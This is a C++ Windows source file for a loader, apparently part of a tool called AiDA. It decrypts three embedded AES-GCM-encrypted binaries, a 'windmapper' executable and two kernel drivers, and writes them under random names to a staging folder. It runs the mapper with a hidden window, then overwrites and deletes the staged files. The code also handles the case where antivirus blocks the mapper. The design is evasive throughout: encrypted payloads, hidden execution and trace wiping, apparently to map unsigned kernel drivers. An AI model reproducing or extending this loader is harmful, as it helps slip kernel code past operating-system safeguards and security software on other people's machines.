#include "driver_loader.hpp"
#include "whoswho_encrypted.h"
#include "sentinel_encrypted.h"
#include "windmapper_embedded.h"
#ifdef AIDA_STANDALONE
#include "helpers/diag_log.hpp"
#endif

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <bcrypt.h>
#include <ntstatus.h>
#include <shlobj.h>
#include <objbase.h>
#include <cstdarg>
#include <cstdio>
#include <cstring>
#include <cwchar>
#include <string>
#include <vector>
#include <filesystem>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")

#ifndef STATUS_AUTH_TAG_MISMATCH
#define STATUS_AUTH_TAG_MISMATCH ((NTSTATUS)0xC000A002L)
#endif

namespace
{
    bool g_loaded = false;
    std::string s_last_error;

    void loader_diag(const char* msg)
    {
#ifdef AIDA_STANDALONE
        diag::log_tagged_critical("driver_loader", msg);
#else
        (void)msg;
#endif
    }

    void loader_diag_fmt(const char* fmt, ...)
    {
#ifdef AIDA_STANDALONE
        char buf[2048];
        va_list ap;
        va_start(ap, fmt);
        _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, ap);
        va_end(ap);
        diag::log_tagged_critical("driver_loader", buf);
#else
        (void)fmt;
#endif
    }

    void set_last_error(const char* msg)
    {
        s_last_error.assign(msg ? msg : "");
        if (!s_last_error.empty())
            loader_diag_fmt("last_error=\"%s\"", s_last_error.c_str());
    }

    void set_last_error(const std::string& msg)
    {
        s_last_error = msg;
        if (!s_last_error.empty())
            loader_diag_fmt("last_error=\"%s\"", s_last_error.c_str());
    }

    void set_last_error_status(const char* prefix, NTSTATUS status)
    {
        char buf[64] = {};
        std::snprintf(buf, sizeof(buf), " (NTSTATUS=0x%08lX)",
                      static_cast<unsigned long>(status));
        std::string out = prefix ? prefix : "";
        out += buf;
        set_last_error(out);
    }

    void set_last_error_fmt(const char* fmt, ...)
    {
        char buf[512];
        va_list ap;
        va_start(ap, fmt);
        vsnprintf(buf, sizeof(buf), fmt, ap);
        va_end(ap);
        set_last_error(buf);
    }

    std::string utf8_from_wide(const std::wstring& w)
    {
        if (w.empty())
            return {};
        int needed = WideCharToMultiByte(CP_UTF8, 0, w.c_str(),
            static_cast<int>(w.size()), nullptr, 0, nullptr, nullptr);
        if (needed <= 0)
            return {};
        std::string out(static_cast<size_t>(needed), '\0');
        WideCharToMultiByte(CP_UTF8, 0, w.c_str(),
            static_cast<int>(w.size()), out.data(), needed, nullptr, nullptr);
        return out;
    }

    bool should_keep_stage()
    {
        wchar_t env[16] = {};
        DWORD n = GetEnvironmentVariableW(L"AIDA_KEEP_DRIVER_STAGE", env, static_cast<DWORD>(_countof(env)));
        if (n == 0)
            n = GetEnvironmentVariableW(L"AIDA_KEEP_STAGE", env, static_cast<DWORD>(_countof(env)));
        return n > 0 && env[0] != L'\0' && env[0] != L'0';
    }

    bool verify_blob_integrity(const unsigned char* data, unsigned long size,
                               unsigned long expected_size)
    {
        if (size != expected_size)
            return false;
        if (size < 64 || data[0] != 'M' || data[1] != 'Z')
            return false;
        uint32_t e_lfanew = *reinterpret_cast<const uint32_t*>(data + 0x3C);
        if (e_lfanew >= size - 4)
            return false;
        if (data[e_lfanew] != 'P' || data[e_lfanew + 1] != 'E' ||
            data[e_lfanew + 2] != 0 || data[e_lfanew + 3] != 0)
            return false;
        return true;
    }

    std::wstring get_module_dir();
    std::wstring random_token(size_t bytes);

    std::wstring get_stage_dir()
    {
        wchar_t override_dir[MAX_PATH] = {};
        DWORD override_len = GetEnvironmentVariableW(L"AIDA_DRIVER_STAGE_DIR", override_dir, MAX_PATH);
        if (override_len > 0 && override_len < MAX_PATH) {
            std::filesystem::path p(override_dir);
            std::error_code ec;
            std::filesystem::create_directories(p, ec);
            if (!ec)
                return p.wstring();
            loader_diag_fmt("stage_override_create_failed path=\"%s\" ec=%lu",
                utf8_from_wide(p.wstring()).c_str(),
                static_cast<unsigned long>(ec.value()));
        }

        std::wstring token = random_token(8);
        if (token.empty())
            return {};
        wchar_t* local = nullptr;
        if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_CREATE, nullptr, &local)) || !local)
            return {};
        std::filesystem::path p(local);
        CoTaskMemFree(local);
        p /= L"AiDA";
        p /= L"Standalone";
        p /= L"AiDADriverStage";
        p /= token;
        std::error_code ec;
        std::filesystem::create_directories(p, ec);
        if (ec)
            return {};
        return p.wstring();
    }

    std::wstring get_module_dir()
    {
        wchar_t path[MAX_PATH] = {};
        DWORD n = GetModuleFileNameW(nullptr, path, MAX_PATH);
        if (n == 0 || n >= MAX_PATH)
            return {};
        std::filesystem::path p(path);
        return p.parent_path().wstring();
    }

    std::wstring resolve_mapper_log_path()
    {
        PWSTR docs = nullptr;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Documents, KF_FLAG_CREATE, nullptr, &docs)) && docs) {
            std::filesystem::path path(docs);
            CoTaskMemFree(docs);
            return (path / L"windmapper.log").wstring();
        }
        if (docs)
            CoTaskMemFree(docs);

        std::wstring module_dir = get_module_dir();
        if (!module_dir.empty())
            return (std::filesystem::path(module_dir) / L"WindMapper_debug.log").wstring();
        return {};
    }

    std::wstring random_token(size_t bytes)
    {
        std::wstring out;
        unsigned char raw[32] = {};
        if (bytes > sizeof(raw))
            bytes = sizeof(raw);
        if (BCryptGenRandom(nullptr, raw, static_cast<ULONG>(bytes),
                            BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0)
            return out;
        static const wchar_t* hex = L"0123456789abcdef";
        out.reserve(bytes * 2);
        for (size_t i = 0; i < bytes; ++i) {
            out.push_back(hex[(raw[i] >> 4) & 0xF]);
            out.push_back(hex[raw[i] & 0xF]);
        }
        return out;
    }

    std::wstring make_stage_path(const std::wstring& dir, const wchar_t* ext)
    {
        if (dir.empty())
            return {};
        if (!ext || !*ext)
            return {};
        std::wstring token = random_token(12);
        if (token.empty())
            return {};
        std::wstring name = token;
        std::filesystem::path p = std::filesystem::path(dir) / (name + ext);
        return p.wstring();
    }

    bool aes_gcm_decrypt(const unsigned char* ciphertext, unsigned long ciphertext_len,
                         const unsigned char* key, unsigned long key_len,
                         const unsigned char* nonce, unsigned long nonce_len,
                         const unsigned char* tag, unsigned long tag_len,
                         unsigned char* plaintext, unsigned long plaintext_len)
    {
        if (!ciphertext || !key || !nonce || !tag || !plaintext)
            return false;
        if (key_len != 32 || nonce_len != 12 || tag_len != 16)
            return false;
        if (ciphertext_len != plaintext_len)
            return false;

        BCRYPT_ALG_HANDLE alg = nullptr;
        NTSTATUS status = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (!BCRYPT_SUCCESS(status)) {
            set_last_error_status("BCryptOpenAlgorithmProvider failed", status);
            return false;
        }

        status = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                                   reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)),
                                   sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (!BCRYPT_SUCCESS(status)) {
            BCryptCloseAlgorithmProvider(alg, 0);
            set_last_error_status("BCryptSetProperty(GCM) failed", status);
            return false;
        }

        DWORD object_length = 0;
        DWORD got = 0;
        status = BCryptGetProperty(alg, BCRYPT_OBJECT_LENGTH,
                                   reinterpret_cast<PUCHAR>(&object_length),
                                   sizeof(object_length), &got, 0);
        if (!BCRYPT_SUCCESS(status) || got != sizeof(object_length) || object_length == 0) {
            BCryptCloseAlgorithmProvider(alg, 0);
            set_last_error_status("BCryptGetProperty(OBJECT_LENGTH) failed", status);
            return false;
        }

        std::vector<unsigned char> key_object(object_length, 0);
        BCRYPT_KEY_HANDLE hkey = nullptr;
        status = BCryptGenerateSymmetricKey(alg, &hkey,
                                            key_object.data(), object_length,
                                            const_cast<PUCHAR>(key), key_len, 0);
        if (!BCRYPT_SUCCESS(status)) {
            BCryptCloseAlgorithmProvider(alg, 0);
            set_last_error_status("BCryptGenerateSymmetricKey failed", status);
            return false;
        }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info = {};
        BCRYPT_INIT_AUTH_MODE_INFO(info);
        info.pbNonce = const_cast<PUCHAR>(nonce);
        info.cbNonce = nonce_len;
        info.pbAuthData = nullptr;
        info.cbAuthData = 0;
        info.pbTag = const_cast<PUCHAR>(tag);
        info.cbTag = tag_len;
        info.pbMacContext = nullptr;
        info.cbMacContext = 0;
        info.cbAAD = 0;
        info.cbData = 0;
        info.dwFlags = 0;

        ULONG out_len = 0;
        status = BCryptDecrypt(hkey,
                               const_cast<PUCHAR>(ciphertext), ciphertext_len,
                               &info,
                               nullptr, 0,
                               plaintext, plaintext_len,
                               &out_len, 0);

        BCryptDestroyKey(hkey);
        SecureZeroMemory(key_object.data(), key_object.size());
        BCryptCloseAlgorithmProvider(alg, 0);

        if (status == STATUS_AUTH_TAG_MISMATCH) {
            SecureZeroMemory(plaintext, plaintext_len);
            set_last_error("AES-GCM tag mismatch (driver blob tampered)");
            return false;
        }
        if (!BCRYPT_SUCCESS(status)) {
            SecureZeroMemory(plaintext, plaintext_len);
            set_last_error_status("BCryptDecrypt failed", status);
            return false;
        }
        if (out_len != plaintext_len) {
            SecureZeroMemory(plaintext, plaintext_len);
            set_last_error("AES-GCM decrypt produced unexpected length");
            return false;
        }
        return true;
    }

    bool decrypt_and_write(const unsigned char* ciphertext, unsigned long ciphertext_len,
                           const unsigned char* key, unsigned long key_len,
                           const unsigned char* nonce, unsigned long nonce_len,
                           const unsigned char* tag, unsigned long tag_len,
                           const std::wstring& out_path,
                           const char* label)
    {
        const std::string out_path_utf8 = utf8_from_wide(out_path);
        loader_diag_fmt("stage_write_begin label=%s path=\"%s\" bytes=%lu",
            label ? label : "?",
            out_path_utf8.empty() ? "<empty>" : out_path_utf8.c_str(),
            ciphertext_len);

        auto* buf = static_cast<unsigned char*>(
            VirtualAlloc(nullptr, ciphertext_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (!buf) {
            set_last_error_fmt("VirtualAlloc failed for %s decrypt buffer gle=%lu bytes=%lu",
                label ? label : "driver", static_cast<unsigned long>(GetLastError()), ciphertext_len);
            return false;
        }

        if (!aes_gcm_decrypt(ciphertext, ciphertext_len,
                             key, key_len,
                             nonce, nonce_len,
                             tag, tag_len,
                             buf, ciphertext_len)) {
            SecureZeroMemory(buf, ciphertext_len);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        if (!verify_blob_integrity(buf, ciphertext_len, ciphertext_len)) {
            SecureZeroMemory(buf, ciphertext_len);
            VirtualFree(buf, 0, MEM_RELEASE);
            set_last_error_fmt("Decrypted %s blob failed PE integrity check", label ? label : "driver");
            return false;
        }

        HANDLE hf = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            DWORD gle = GetLastError();
            SecureZeroMemory(buf, ciphertext_len);
            VirtualFree(buf, 0, MEM_RELEASE);
            set_last_error_fmt("CreateFileW failed for staged %s gle=%lu path=\"%s\"",
                label ? label : "driver", static_cast<unsigned long>(gle),
                out_path_utf8.empty() ? "<empty>" : out_path_utf8.c_str());
            return false;
        }

        DWORD written = 0;
        BOOL ok = WriteFile(hf, buf, ciphertext_len, &written, nullptr);
        DWORD write_gle = GetLastError();
        FlushFileBuffers(hf);
        CloseHandle(hf);
        SecureZeroMemory(buf, ciphertext_len);
        VirtualFree(buf, 0, MEM_RELEASE);

        if (!ok || written != ciphertext_len) {
            set_last_error_fmt("WriteFile failed for staged %s ok=%d written=%lu expected=%lu gle=%lu path=\"%s\"",
                label ? label : "driver",
                ok ? 1 : 0,
                static_cast<unsigned long>(written),
                ciphertext_len,
                static_cast<unsigned long>(write_gle),
                out_path_utf8.empty() ? "<empty>" : out_path_utf8.c_str());
            return false;
        }
        loader_diag_fmt("stage_write_ok label=%s path=\"%s\" bytes=%lu",
            label ? label : "?",
            out_path_utf8.empty() ? "<empty>" : out_path_utf8.c_str(),
            ciphertext_len);
        return true;
    }

    void secure_delete(const std::wstring& path)
    {
        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER size;
            if (GetFileSizeEx(hf, &size) && size.QuadPart > 0) {
                unsigned char zeros[65536];
                SecureZeroMemory(zeros, sizeof(zeros));
                LARGE_INTEGER pos = {};
                SetFilePointerEx(hf, pos, nullptr, FILE_BEGIN);
                LONGLONG remaining = size.QuadPart;
                while (remaining > 0) {
                    DWORD chunk = remaining > static_cast<LONGLONG>(sizeof(zeros))
                        ? static_cast<DWORD>(sizeof(zeros))
                        : static_cast<DWORD>(remaining);
                    DWORD written = 0;
                    if (!WriteFile(hf, zeros, chunk, &written, nullptr) || written == 0)
                        break;
                    remaining -= written;
                }
                FlushFileBuffers(hf);
            }
            CloseHandle(hf);
        }
        DeleteFileW(path.c_str());
    }

    void cleanup_stage_file(const std::wstring& path, const char* label)
    {
        if (path.empty())
            return;
        const std::string path_utf8 = utf8_from_wide(path);
        if (should_keep_stage()) {
            loader_diag_fmt("stage_preserved label=%s path=\"%s\"",
                label ? label : "?",
                path_utf8.empty() ? "<empty>" : path_utf8.c_str());
            return;
        }
        loader_diag_fmt("stage_delete label=%s path=\"%s\"",
            label ? label : "?",
            path_utf8.empty() ? "<empty>" : path_utf8.c_str());
        secure_delete(path);
    }

    void cleanup_stage_dir(const std::wstring& path)
    {
        if (path.empty() || should_keep_stage())
            return;
        std::error_code ec;
        std::filesystem::remove(path, ec);
        loader_diag_fmt("stage_dir_delete path=\"%s\" ec=%lu",
            utf8_from_wide(path).c_str(),
            static_cast<unsigned long>(ec.value()));
    }

}

namespace driver_loader
{
    bool is_driver_loaded()
    {
        return g_loaded;
    }

    void mark_already_loaded()
    {
        g_loaded = true;
        s_last_error.clear();
    }

    const std::string& last_error()
    {
        return s_last_error;
    }

    bool initialize_and_load()
    {
        if (g_loaded)
            return true;

        s_last_error.clear();
        loader_diag("initialize_and_load_begin");

        std::wstring stage = get_stage_dir();
        if (stage.empty()) {
            set_last_error("Failed to resolve LocalAppData stage directory");
            return false;
        }
        loader_diag_fmt("stage_dir=\"%s\" keep_stage=%d",
            utf8_from_wide(stage).c_str(), should_keep_stage() ? 1 : 0);

        std::wstring mapper_path = make_stage_path(stage, L".exe");
        std::wstring whoswho_path = make_stage_path(stage, L".sys");
        std::wstring sentinel_path = make_stage_path(stage, L".sys");
        if (mapper_path.empty() || whoswho_path.empty() || sentinel_path.empty()) {
            set_last_error("Failed to allocate driver stage paths");
            return false;
        }
        loader_diag_fmt("stage_paths mapper=\"%s\" whoswho=\"%s\" sentinel=\"%s\"",
            utf8_from_wide(mapper_path).c_str(),
            utf8_from_wide(whoswho_path).c_str(),
            utf8_from_wide(sentinel_path).c_str());

        if (!decrypt_and_write(g_windmapper_ciphertext, g_windmapper_ciphertext_len,
                               g_windmapper_key, sizeof(g_windmapper_key),
                               g_windmapper_nonce, sizeof(g_windmapper_nonce),
                               g_windmapper_tag, sizeof(g_windmapper_tag),
                               mapper_path, "windmapper")) {
            cleanup_stage_file(mapper_path, "windmapper");
            cleanup_stage_dir(stage);
            return false;
        }

        if (!decrypt_and_write(g_whoswho_ciphertext, g_whoswho_ciphertext_len,
                               g_whoswho_key, sizeof(g_whoswho_key),
                               g_whoswho_nonce, sizeof(g_whoswho_nonce),
                               g_whoswho_tag, sizeof(g_whoswho_tag),
                               whoswho_path, "whoswho")) {
            cleanup_stage_file(mapper_path, "windmapper");
            cleanup_stage_file(whoswho_path, "whoswho");
            cleanup_stage_dir(stage);
            return false;
        }

        if (!decrypt_and_write(g_sentinel_ciphertext, g_sentinel_ciphertext_len,
                               g_sentinel_key, sizeof(g_sentinel_key),
                               g_sentinel_nonce, sizeof(g_sentinel_nonce),
                               g_sentinel_tag, sizeof(g_sentinel_tag),
                               sentinel_path, "sentinel")) {
            cleanup_stage_file(mapper_path, "windmapper");
            cleanup_stage_file(whoswho_path, "whoswho");
            cleanup_stage_file(sentinel_path, "sentinel");
            cleanup_stage_dir(stage);
            return false;
        }

        std::wstring cmdline = L"\"" + mapper_path + L"\" \"" +
                               whoswho_path + L"\" \"" + sentinel_path + L"\"";
        loader_diag_fmt("mapper_cmdline=\"%s\"", utf8_from_wide(cmdline).c_str());

        std::wstring mapper_log_path = resolve_mapper_log_path();
        if (!mapper_log_path.empty()) {
            SetEnvironmentVariableW(L"AIDA_MAPPER_LOG", mapper_log_path.c_str());
            loader_diag_fmt("mapper_log_path=\"%s\"", utf8_from_wide(mapper_log_path).c_str());
        } else {
            SetEnvironmentVariableW(L"AIDA_MAPPER_LOG", nullptr);
            loader_diag("mapper_log_path=<unresolved>");
        }

        STARTUPINFOW si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        loader_diag("mapper_create_process_begin");
        BOOL created = CreateProcessW(
            mapper_path.c_str(),
            &cmdline[0],
            nullptr, nullptr,
            FALSE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            nullptr, nullptr,
            &si, &pi);

        if (!created) {
            DWORD gle = GetLastError();
            cleanup_stage_file(mapper_path, "windmapper");
            cleanup_stage_file(whoswho_path, "whoswho");
            cleanup_stage_file(sentinel_path, "sentinel");
            cleanup_stage_dir(stage);
            if (gle == ERROR_VIRUS_INFECTED || gle == ERROR_VIRUS_DELETED) {
                set_last_error_fmt("Security software blocked mapper stage gle=%lu mapper=\"%s\" stage_dir=\"%s\"",
                    static_cast<unsigned long>(gle),
                    utf8_from_wide(mapper_path).c_str(),
                    utf8_from_wide(stage).c_str());
            } else {
                set_last_error_fmt("CreateProcessW failed for mapper stage gle=%lu mapper=\"%s\"",
                    static_cast<unsigned long>(gle), utf8_from_wide(mapper_path).c_str());
            }
            return false;
        }
        loader_diag_fmt("mapper_create_process_ok pid=%lu tid=%lu",
            static_cast<unsigned long>(pi.dwProcessId),
            static_cast<unsigned long>(pi.dwThreadId));

        HANDLE hJob = CreateJobObjectW(nullptr, nullptr);
        if (hJob) {
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
            jeli.BasicLimitInformation.LimitFlags =
                JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE |
                JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
            SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
                                    &jeli, sizeof(jeli));
            BOOL assigned = AssignProcessToJobObject(hJob, pi.hProcess);
            loader_diag_fmt("mapper_job assigned=%d gle=%lu",
                assigned ? 1 : 0, static_cast<unsigned long>(GetLastError()));
        } else {
            loader_diag_fmt("mapper_job create_failed gle=%lu", static_cast<unsigned long>(GetLastError()));
        }

        DWORD resume_result = ResumeThread(pi.hThread);
        if (resume_result == static_cast<DWORD>(-1)) {
            loader_diag_fmt("mapper_resume_failed gle=%lu",
                static_cast<unsigned long>(GetLastError()));
        } else {
            loader_diag_fmt("mapper_resume_ok previous_suspend_count=%lu",
                static_cast<unsigned long>(resume_result));
        }

        DWORD wait_result = WaitForSingleObject(pi.hProcess, 90000);
        DWORD wait_gle = GetLastError();
        loader_diag_fmt("mapper_wait result=0x%08lX gle=%lu",
            static_cast<unsigned long>(wait_result),
            static_cast<unsigned long>(wait_gle));

        DWORD exit_code = 1;
        BOOL got_exit = GetExitCodeProcess(pi.hProcess, &exit_code);
        DWORD exit_gle = GetLastError();
        loader_diag_fmt("mapper_exit got=%d code=0x%08lX gle=%lu log=\"%s\"",
            got_exit ? 1 : 0,
            static_cast<unsigned long>(exit_code),
            static_cast<unsigned long>(exit_gle),
            mapper_log_path.empty() ? "<unresolved>" : utf8_from_wide(mapper_log_path).c_str());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (hJob)
            CloseHandle(hJob);

        cleanup_stage_file(mapper_path, "windmapper");
        cleanup_stage_file(whoswho_path, "whoswho");
        cleanup_stage_file(sentinel_path, "sentinel");
        cleanup_stage_dir(stage);

        if (wait_result == WAIT_TIMEOUT) {
            set_last_error_fmt("Mapper stage timed out after 90000 ms log=\"%s\"",
                mapper_log_path.empty() ? "<unresolved>" : utf8_from_wide(mapper_log_path).c_str());
            return false;
        }
        if (wait_result == WAIT_FAILED) {
            set_last_error_fmt("WaitForSingleObject failed for mapper gle=%lu log=\"%s\"",
                static_cast<unsigned long>(wait_gle),
                mapper_log_path.empty() ? "<unresolved>" : utf8_from_wide(mapper_log_path).c_str());
            return false;
        }

        if (exit_code != 0) {
            set_last_error_fmt("Mapper stage exited with non-zero status exit_code=0x%08lX log=\"%s\"",
                static_cast<unsigned long>(exit_code),
                mapper_log_path.empty() ? "<unresolved>" : utf8_from_wide(mapper_log_path).c_str());
            return false;
        }

        g_loaded = true;

        loader_diag("initialize_and_load_success");
        return true;
    }
}
